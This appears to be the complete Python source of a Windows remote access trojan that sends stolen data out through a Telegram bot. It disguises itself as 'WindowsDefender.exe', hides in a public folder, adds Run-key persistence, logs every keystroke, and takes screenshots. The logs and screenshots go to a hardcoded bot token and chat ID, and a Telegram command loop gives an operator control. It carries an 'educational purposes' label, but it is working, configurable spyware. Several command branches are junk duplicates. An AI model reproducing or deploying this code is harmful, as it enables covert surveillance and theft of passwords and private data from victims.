#██████╗░░█████╗░████████╗░░██████╗░██╗░░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝░░██╔══██╗╚██╗░██╔╝
#██████╔╝███████║░░░██║░░░░░██████╔╝░╚████╔╝░
#██╔══██╗██╔══██║░░░██║░░░░░██╔═══╝░░░╚██╔╝░░
#██║░░██║██║░░██║░░░██║░░░░░██║░░░░░░░░██║░░░
#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░
#░██████╗██████╗░██╗░░░██╗░████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗░░░░░░
#██╔════╝██╔══██╗╚██╗░██╔╝░╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║░░░░░░
#╚█████╗░██████╔╝░╚████╔╝░░░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║░░░░░░
#░╚═══██╗██╔═══╝░░░╚██╔╝░░░░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║░░░░░░
#██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
#╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
#region import Libs
import socket		# Verifica internet
import threading 	# procesos multihilos
from pynput.keyboard import Listener            # Escucha eventos del teclado
from getpass import getuser     # Obtiene el nombre del usuario
from datetime import datetime   # Devuelve fecha y hora actual
from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
import datetime                 # Devuelve fecha y hora actual
import random                   # Genera numeros
import os                       # Lib para copiar archivos
import telepot                  # Telegram API
from telepot.loop import MessageLoop    # Telegram API [New Thread]
import shutil                   # Lib para crear carpetas
import string                   # Lib genera textos
import time                     # Contar segundos
from PIL import ImageGrab       # Toma capturas de pantalla
#endregion

#region Code Main



class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_REG = "Windows Defeder REG"                                           # Nombre del Keylogger en el registro
        self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"           # Ruta del Registro de teclas
        self.LOG_NAME = "reg" + ".k"
        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"   # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY    # <No cambiar>
        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME    # <No cambiar>
        self.USERNAME = getuser()                               # Windows UserName or custom name
        self.TROJAN = False                                    # Active or disable function Trojan
        self.STARTUP = False                                     # Active or diable function StarUp
        self.SCREENSHOT = False                                  # active or disable function Screenshot
        self.KEYLOGGER = True                                   # active or disable function Keylogger
        self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
        self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
        self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
    class TelegramBot:
        def __init__(self):
            self.ID   = 83175                                                     # ID Principal [Obligatorio]
            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
            self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM"             # TOKEN de tu Bot [Obligatorio]
            # Personalize
            self.LEN_TEXT = 1  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada

class Functions:
    def CurrentTime(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
    def CheckFolder_StartUP(self):  # Función especial para el startUp
        try:    # Intenta crear la dirección
            os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
            return True     # Se creó la carpeta
        except:
            return False    # La carpeta ya existe
        pass
    def RandomChar(self,number =50): # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))
    def pathRamdom_log(self, number = 23):
        return Config().PATH_HIDDEN_LOG + self.RandomChar(number) + ".txt"
    def pathRamdom_ScreenShot(self, long=10):
        return Config().PATH_HIDDEN_LOG+ Config().USERNAME + " - " + self.CurrentTime() + self.RandomChar(long)+".jpg"
    # Función = Verifica si hay conexión a internet para poder envíar el log
    def VerifyConnection(self):
        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
        try:                                                            # Intenta conectarse al servidor de Google
            con.connect(('www.google.com', 80))
            con.close()
            print("[Test Internet] => [OK]")
            return True
        except:
            print("[Test Internet] => [NO]")
            return False

    def LenghtText(self):  # Verifica el el registro tiene una cierta cantidad de texto
        try:  # Busca el archivo
            regk = open(Config().PATH_LOG, 'r')
            LEN_TEXT = len(regk.read())
            print("[LenghtText] Se encontró el Archivo " + Config().LOG_NAME + " correctamente")
            if LEN_TEXT >= Config.TelegramBot().LEN_TEXT:
                print("[LenghtText] El Registro tiene " + str(LEN_TEXT) + " caracteres y es superior a " + str(Config.TelegramBot().LEN_TEXT))
                regk.close()
                return True
            else:
                print("[LenghtText] El Registro tiene " + str(LEN_TEXT) + " caracteres y es inferior de " + str( Config.TelegramBot().LEN_TEXT))
                regk.close()
                return False
        except:
            print("[LenghtText] No se encontró el Archivo: " + Config().PATH_KEY)
            return False

class Util:
    def __init__(self): #Constructor?
        pass
    def CreateFolders(self):    # Crea el directorio oculto
        try:  # Intenta crear la dirección
            os.makedirs(Config().PATH_HIDDEN_KEY)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_HIDDEN_KEY)
        except:
            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_HIDDEN_KEY)
        try:  # Intenta crear la dirección del registro de teclas..
            os.makedirs(Config().PATH_HIDDEN_LOG)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
        except:
            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
    def RenameFileKey(self,name): # Renombre el archivo log, antes de ser envíado
        try:
            self.CreateFolders()  # Crea el directorios [Evita posibles errores]
            # Copia el archivo
            path = Config().PATH_HIDDEN_LOG + name
            os.rename(Config().PATH_LOG, path)
            print("El archivo reg.k se renombró correctamente")
        except:
            print("No se puedo renombrar el archivo 'reg.k' ")
            pass
    def addStartUp(self):
        print("[StartUp] Iniciando Función")
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:    # Solo si tiene permisos de administrador
            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
            SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
            Functions().CheckFolder_StartUP() # Crea carpeta
            print("[StartUp] Exitoso Administrador")
        except:
            print("[StartUp] USER - Verificando existencia")
            if Functions().CheckFolder_StartUP():
                print("[StartUp] USER - No se encontró, creando...")
                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                print("[StartUp] USER - EXITOSO")
    def Trojan(self):   # Se Replica en el sistema
        self.CreateFolders()
        try:
            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
        except:
            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
            try:
                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
                print("\n[Trojan] - Se replico en el sistema correctamente")
            except:
                print("\n[Trojan] - Hubo un problema al replicar en el sistema")
    def SendBotScreenShot(self, ID, PATH_SCREEN):
        try:
            bot = telepot.Bot(Config.TelegramBot().TOKEN)
            bot.sendChatAction(ID, 'typing')
            bot.sendChatAction(ID, 'upload_photo')
            bot.sendDocument(ID, open(PATH_SCREEN, 'rb'))
            print("[ScreenShot] Se envió correctamente al ID: " + str(ID))
        except:
            print("[ScreenShot] Hubo un error en el proceso. ID: " + str(ID))
    def Screenshot(self,path):
        imagen = ImageGrab.grab()
        print("[ScreenShot] Se tomó una captura ")
        imagen.save(path)
        print("[ScreenShot] Se guardó correctamente la captura")

    def TelegramBot(self):
        print("[TelegramBot] start....")
        if Functions().LenghtText():
            pathN = Functions().pathRamdom_log()
            os.rename(Config().PATH_LOG, pathN)
            # Abre el archivo
            f = open(pathN, 'r')
            def SendT(ID):
                try:
                    botk = telepot.Bot(Config.TelegramBot().TOKEN)  # Token
                    botk.sendMessage(Config.TelegramBot().ID, "User: " + Config().USERNAME + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
                    print("[TelegramBot] se envió a Telegram [ID] = " + str(ID))
                except:
                    print("[TelegramBot] no se pudo enviar el archivo [ID] = " + str(ID))

            print("[TelegramBot] Intentado enviar...")
            if Config.TelegramBot().ID != 000000000:
                SendT(Config.TelegramBot().ID)

            if Config.TelegramBot().ID_2 != 000000000:
                SendT(Config.TelegramBot().ID_2)

            if Config.TelegramBot().ID_3 != 000000000:
                SendT(Config.TelegramBot().ID_3)
            f.close()
            os.remove(pathN)
            print("[TelegramBot] Se eliminó el archivo caché correctamente")
        else:
            pass


class Send:
    def __init__(self):
        pass
    def Log(self):
        print("[SendLog] Active...")
        while True:
            print("[SendLog] El tiempo de espera es: " + str(Config().TIME_SEND) + "minutos")
            time.sleep(Config().TIME_SEND * 60)  # Tiempo de espera por minutos
            #time.sleep(10) # Solo antigueeo
            if Functions().VerifyConnection():
                Util().TelegramBot()
    def ScreenShot(self):
        print("[ScreenShot] Active...")
        while True:
            print("[ScreenShot] Wait: " + str(Config().TIME_SCREENSHOT) + " seconds")
            time.sleep(Config().TIME_SCREENSHOT)
            pathScreen = Functions().pathRamdom_ScreenShot()
            if Functions().VerifyConnection():
                Util().Screenshot(pathScreen)
                # Envía a distintas cuentas simultaneamente
                if Config.TelegramBot().ID != 000000000:
                    print("[Send ScreenShot] ID Aceptado")
                    Util().SendBotScreenShot(Config.TelegramBot().ID, pathScreen)

                if Config.TelegramBot().ID_2 != 000000000:
                    print("[Send ScreenShot] ID 2 Aceptado")
                    Util().SendBotScreenShot(Config.TelegramBot().ID_2, pathScreen)

                if Config.TelegramBot().ID_3 != 000000000:
                    print("[Send ScreenShot] ID 3 Aceptado")
                    Util().SendBotScreenShot(Config.TelegramBot().ID_3, pathScreen)

                # Se terminó de enviar
                try:
                    os.remove(pathScreen)
                    print("[ScreenShot] Se eliminó caché")
                except:
                    print("[ScreenShot] No se pudo eliminar el caché ")

class Keylogger:
    def __init__(self):
        pass
    # Convierte tecla a un valor legible
    def KeyConMin(self, numberKey):                # Caracteres Comunes // Optimizados
        switcher = {
            # Vocales Minisculas
            "'a'": "a",
            "'e'": "e",
            "'i'": "i",
            "'o'": "o",
            "'u'": "u",
            # Letras  Minusculas
            "'b'": "b",
            "'c'": "c",
            "'d'": "d",
            "'f'": "f",
            "'g'": "g",
            "'h'": "h",
            "'j'": "j",
            "'J'": "J",
            "'k'": "k",
            "'l'": "l",
            "'m'": "m",
            "'n'": "n",
            "'ñ'": "ñ",
            "'p'": "p",
            "'q'": "q",
            "'r'": "r",
            "'s'": "s",
            "'t'": "t",
            "'v'": "v",
            "'w'": "w",
            "'x'": "x",
            "'y'": "y",
            "'z'": "z",
            # Caracteres
            "','": ",",                     # ,
            "'.'": ".",                     # .
            "'_'": "_",                     # _
            "'-'": "-",                     # -
            "':'": ":",                     #
            # Vocales Mayúsculas
            "'A'": "A",
            "'E'": "E",
            "'I'": "I",
            "'O'": "O",
            "'U'": "U",
            # Letras Mayúsculas
            "'B'": "B",
            "'C'": "C",
            "'D'": "D",
            "'F'": "F",
            "'G'": "G",
            "'H'": "H",
            "'K'": "K",
            "'L'": "L",
            "'M'": "M",
            "'N'": "N",
            "'Ñ'": "Ñ",
            "'P'": "P",
            "'Q'": "Q",
            "'R'": "R",
            "'S'": "S",
            "'T'": "T",
            "'V'": "V",
            "'W'": "W",
            "'X'": "X",
            "'Y'": "Y",
            "'Z'": "Z",
            # Números Standard
            "'1'": "1",
            "'2'": "2",
            "'3'": "3",
            "'4'": "4",
            "'5'": "5",
            "'6'": "6",
            "'7'": "7",
            "'8'": "8",
            "'9'": "9",
            "'0'": "0",
            # Caracteres Especiales
            "'@'": "@",                     # @
            "'#'": "#",                     # #
            "'*'": "*",                     # *
            "'('": "(",                     # (
            "')'": ")",                     # )
            '"\'"': "'",                    # '
            "'\"'": '"',                    # "
            "'?'": "?",                     # ?
            "'='": "=",                     # =
            "'+'": "+",                     # +
            "'!'": "!",                     # !
            "'}'": "}",                     # }
            "'{'": "{",                     # {}
            "'´'": "´",                     # ´
            "'|'": "|",                     # |
            "'°'": "°",                     # °
            "'^'": "¬",                     # ^
            "';'": ";",                     #
            "'$'": "$",                     # $
            "'%'": "%",                     # %
            "'&'": "&",                     # &
            "'>'": ">",                     #
            "'<'": "<",                     #
            "'/'": "/",                     # /
            "'¿'": "¿",                     # ¿
            "'¡'": "¡",                     # ¡
            "'~'": "~"                      #
        }
        return switcher.get(numberKey, "")

    # Convierte tecla a un valor legible
    def KeyConMax(self, numberKey):  # Botones, comunes // Optimizados
        switcher = {
            "Key.space": " ",  # Espacio
            "Key.backspace": "«",  # Borrar
            "Key.enter": "\n",  # Salto de linea
            "Key.tab": "    ",  # Tabulación
            "Key.delete": " «×» ",  # Suprimir
            # Números
            "<96>": "0",  # 0
            "<97>": "1",  # 1
            "<98>": "2",  # 2
            "<99>": "3",  # 3
            "<100>": "4",  # 4
            "<101>": "5",  # 5
            "<102>": "6",  # 6
            "<103>": "7",  # 7
            "<104>": "8",  # 8
            "<105>": "9",  # 9
            # Números Númeral
            "None<96>": "0",  # 0
            "None<97>": "1",  # 1
            "None<98>": "2",  # 2
            "None<99>": "3",  # 3
            "None<100>": "4",  # 4
            "None<101>": "5",  # 5
            "None<102>": "6",  # 6
            "None<103>": "7",  # 7
            "None<104>": "8",  # 8
            "None<105>": "9",  # 9
            # Teclas raras 2
            "['^']": "^",
            "['`']": "`",  #
            "['¨']": "¨",  #
            "['´']": "´",  #
            "<110>": ".",  #
            "None<110>": ".",  #
            "Key.alt_l": " [AltL] ",  #
            "Key.alt_r": " [AltR] ",
            "Key.shift_r": " [ShiftR] ",
            "Key.shift": " [ShiftL] ",
            "Key.ctrl_r": " [CtrlR] ",  #
            "Key.ctrl_l": " [CtrlL] ",  #
            "Key.right": " [Right] ",  #
            "Key.left": " [Left] ",  #
            "Key.up": " [Up]",  #
            "Key.down": " [Down] ",  #
            # "'\x16'"  : " [Pegó] ",
            # "'\x18'"  : " [Cortar] ",
            # "'\x03'"  : " [Copiar] ",
            "Key.caps_lock": " [MayusLock] ",
            # "Key.media_previous"    : " ♫ ",     #
            # "Key.media_next"        : " ♫→ ",         #
            # "Key.media_play_pause"  : " ■ ♫ ■ ",#
            "Key.cmd": " [W] "  #
        }
        return switcher.get(numberKey, "")

    def GetKeys(self):
        try:  # Intenta crear el archivo
            log = os.environ.get('pylogger_file', os.path.expanduser(Config().PATH_LOG))
            with open(log, "a") as f:
                f.write(
                    "")  # \n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
        except:  # Si no puede crear el archivo, crea el directorio faltante
            Util().CreateFolders()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender

        def on_press(key):
            with open(log, "a") as f:
                # print(str(key)) <= habilitar Solo antiDebug
                if (len(str(key))) <= 3:
                    print("Se oprimio la tecla: " + self.KeyConMin(str(key)))
                    f.write(self.KeyConMin(str(key)))
                else:
                    print("Se oprimio la tecla: " + self.KeyConMax(str(key)) )
                    f.write(self.KeyConMax(str(key)))

        with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
            listener.join()
#endregion


def handle(msg):
    command = msg['text']           # Recibe el texto que el usuario mande al bot
    ID = Config.TelegramBot().ID    # ID personal
    cache = ""
    if command == "/about":
        cache = ""\
        '\n<b>Developed by:</b> <code>SebastianEPH</code>' \
        '\n<b>Product Name: </b><a href="https://github.com/SebastianEPH/RATpySpyTelegramBot"> RATpySpyTelegramBot</a>' \
        '\n<b>Type Software:</b> <code>Remote Administration tool</code>' \
        '\n<b>Versión:</b> <code>1.0</code>' \
        '\n<b>State:</b> <code>Alfa</code>' \
        '\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>' \
        '\n<b>Size:</b> <code>No disponible</code>' \
        '\n<b>Undetectable:</b> <code>Not tester</code>' \
        '\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>' \
        '\n<b>Programming Lenguage:</b> <code>Python 3.8</code>' \
        '\n<b>Licence:</b> <code>GNU Licence</code>' \
        '\n<b>IDE:</b> PyCharm <i>[Education license]</i>' \
        '\n<b>Description:</b>' \
        '\nRemote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands.  \n<b>[Educational purposes]</b>' \
        '\n<b></b>' \
        '\n<b></b>' \
        '\n<b>Contact: </b>' \
        '\n<b> - <a href="https://github.com/SebastianEPH">GitHub</a> </b>' \
        '\n<b> - <a href="https://t.me/sebastianeph">Telegram</a> </b>' \
        '\n<b> - <a href="https://sebastianeph.github.io/">WebSite</a> </b>' \
        '\n<b> - SebastianEPH99@gmail.com</b>' \
        '\n<b></b>' \
        '\n<b>You can read the documentation at the following link >></b>' \
        '\n<b></b>'
        bot.sendMessage(ID, cache, parse_mode='html')
        bot.sendPhoto(ID, "https://i.imgur.com/SelWET0.png")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        pathScreen = Functions().pathRamdom_ScreenShot()
        print(pathScreen)
        Util().Screenshot(pathScreen)
        #Util().SendBotScreenShot(bot,ID,pathScreen)
        bot.sendChatAction(ID, 'upload_photo')
        bot.sendDocument(ID, open(pathScreen, 'rb'))
        # Se terminó de enviar
        try:
            os.remove(pathScreen)
            print("[Command] /Screenshot Exitoso y se eliminó caché")
        except:
            print("[Command] /Screenshot Fallido y no se pudo eliminar el caché ")
    elif command == "/screenshotd":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshosdt":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screesdfnshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screensfshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenssfhot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenfssfhot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screfdgenssdfhot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenfdsdfshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    else:
        FUNCTIONELITIES = "Write "\
        "red_info => Información de la Red\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/keylogger_active     => Active Keylogger\n" \
        "/keylogger_disable   => Disable Keylogger\n" \
        "/keylogger_get          => Get keylog\n" \
        "/screenshot   => Take a screenshot\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/about"
        bot.sendMessage(ID, FUNCTIONELITIES)
        print("[Command] /help other")

# Starting Script
if __name__ == '__main__':
    print("[RAT] Start")

    Util().Trojan()     if Config().TROJAN else print("[Trojan] Disable...")  # Mode Trojan
    Util().addStartUp() if Config().STARTUP else print("[StartUp] Disable...")  # Added in Startup

    # Delay
    print("[Keylogger] Delay... " + str(Config().DELAY))
    time.sleep(Config().DELAY)
    print("[Keylogger] Finish Delay")
    print("[Keylogger] Listening to Keys...")
    # Create and start threads

    threading.Thread(target=Send().Log).start()  # Envía Registro
    threading.Thread(target=Keylogger().GetKeys).start() if Config().KEYLOGGER else print("[Keylogger] Disable...")  # Registra pulsaciones
    threading.Thread(target=Send().ScreenShot).start() if Config().SCREENSHOT  else print("[ScreenShot] Disable...")  # Screenshot

    # Instancia Bot con Token
    bot = telepot.Bot(Config().TelegramBot().TOKEN)
    bot.sendMessage(Config().TelegramBot().ID, "User: ["+Config().USERNAME + "] It is Online...")
    # Execute other thread what listening
    MessageLoop(bot, handle).run_as_thread()
    print('Listening ...')

    # Keylogger
    print("[Keylogger] start...")

    # Keep the program running.
    while True:
        time.sleep(120)
